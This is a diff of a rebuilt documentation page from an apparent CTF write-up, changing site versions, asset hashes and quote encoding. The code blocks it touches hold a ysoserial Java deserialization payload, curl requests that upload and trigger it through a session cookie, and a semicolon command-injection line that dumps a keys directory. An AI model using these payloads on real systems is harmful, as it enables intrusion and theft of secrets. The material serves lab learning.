@@ -21,7 +21,7 @@
       
       
       <link rel="icon" href="../../img/misc/favicon.ico">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
     
     
       
@@ -29,7 +29,7 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
       
         
         <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
@@ -1271,7 +1271,7 @@ This shows that I can use a CommonsCollections payload.</p>
 <span class="normal">6</span>
 <span class="normal">7</span>
 <span class="normal">8</span>
-<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>CommonsCollections2<span class="w"> </span><span class="s2">&quot;curl http://127.0.0.1:8005&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>payload.bin
+<span class="normal">9</span></pre></div></td><td class="code"><div><pre><span></span><code>java<span class="w"> </span>-jar<span class="w"> </span>ysoserial.jar<span class="w"> </span>CommonsCollections2<span class="w"> </span><span class="s2">"curl http://127.0.0.1:8005"</span><span class="w"> </span>&gt;<span class="w"> </span>payload.bin
 <span class="nb">export</span><span class="w"> </span><span class="nv">HOST</span><span class="o">=</span><span class="m">127</span>.0.0.1
 <span class="nb">export</span><span class="w"> </span><span class="nv">PORT</span><span class="o">=</span><span class="m">8005</span>
 curl<span class="w"> </span>http://127.0.0.1:8005
@@ -1291,15 +1291,15 @@ curl<span class="w"> </span>http://127.0.0.1:80
 <span class="normal">15</span>
 <span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">SESSION_ID</span><span class="o">=</span><span class="m">1</span>
 curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Content-Length: </span><span class="k">$(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Content-Range: bytes 0-</span><span class="k">$(($(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="s2">/</span><span class="k">$(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s2">"Host: </span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s2">"Content-Length: </span><span class="k">$(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s2">"Content-Range: bytes 0-</span><span class="k">$(($(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="s2">/</span><span class="k">$(</span>wc<span class="w"> </span>-c<span class="w"> </span>&lt;<span class="w"> </span>payload.bin<span class="k">)</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
 <span class="w">    </span>--data-binary<span class="w"> </span>@payload.bin<span class="w"> </span><span class="se">\</span>
-<span class="w">    </span><span class="s2">&quot;http://</span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">SESSION_ID</span><span class="si">}</span><span class="s2">/session&quot;</span>
+<span class="w">    </span><span class="s2">"http://</span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">/</span><span class="si">${</span><span class="nv">SESSION_ID</span><span class="si">}</span><span class="s2">/session"</span>
 curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Host: </span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">    </span>-H<span class="w"> </span><span class="s2">&quot;Cookie: JSESSIONID=</span><span class="si">${</span><span class="nv">SESSION_ID</span><span class="si">}</span><span class="s2">&quot;</span><span class="w"> </span><span class="se">\</span>
-<span class="w">    </span><span class="s2">&quot;http://</span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">/&quot;</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s2">"Host: </span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-H<span class="w"> </span><span class="s2">"Cookie: JSESSIONID=</span><span class="si">${</span><span class="nv">SESSION_ID</span><span class="si">}</span><span class="s2">"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="s2">"http://</span><span class="si">${</span><span class="nv">HOST</span><span class="si">}</span><span class="s2">:</span><span class="si">${</span><span class="nv">PORT</span><span class="si">}</span><span class="s2">/"</span>
 </code></pre></div></td></tr></table></div>
 <p><img alt="Screenshot 2026-01-13 115151" src="../../img/objectives/o20/Screenshot%202026-01-13%20115151.png" /></p>
 <p>I checked the keys folder directly and confirmed I did not have permissions as the current user.</p>
@@ -1311,7 +1311,7 @@ ls<span class="w"> </span>/usr/local/weather/keys
 <p>Since I was stuck, I checked online and found a report at this link <a href="https://www.youtube.com/watch?v=rm8aunk9dSg&amp;t=1247s">https://www.youtube.com/watch?v=rm8aunk9dSg&amp;t=1247s</a> for the objective.</p>
 <p>From there, I found out that I can run the weather helper with the first key and get the second key.</p>
 <p>Finally, I ran the weather helper with the first key and read the weather keys directory to extract the second key.</p>
-<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Extract the second key</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code>/usr/local/weather/temperature<span class="w"> </span><span class="s2">&quot;4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6&quot;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/usr/local/weather/keys/*<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&quot;</span>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Extract the second key</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">10</span></pre></div></td><td class="code"><div><pre><span></span><code>/usr/local/weather/temperature<span class="w"> </span><span class="s2">"4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6"</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/usr/local/weather/keys/*<span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">""</span>
 </code></pre></div></td></tr></table></div>
 <p><img alt="Screenshot 2026-01-13 193405" src="../../img/objectives/o20/Screenshot%202026-01-13%20193405.png" /></p>
 <p>After submitting the flag, the objective was added to the achievements list.</p>
@@ -1410,7 +1410,7 @@ ls<span class="w"> </span>/usr/local/weather/keys
       <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["toc.integrate", "content.code.copy", "navigation.sections"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tablesort/5.2.1/tablesort.min.js"></script>
       
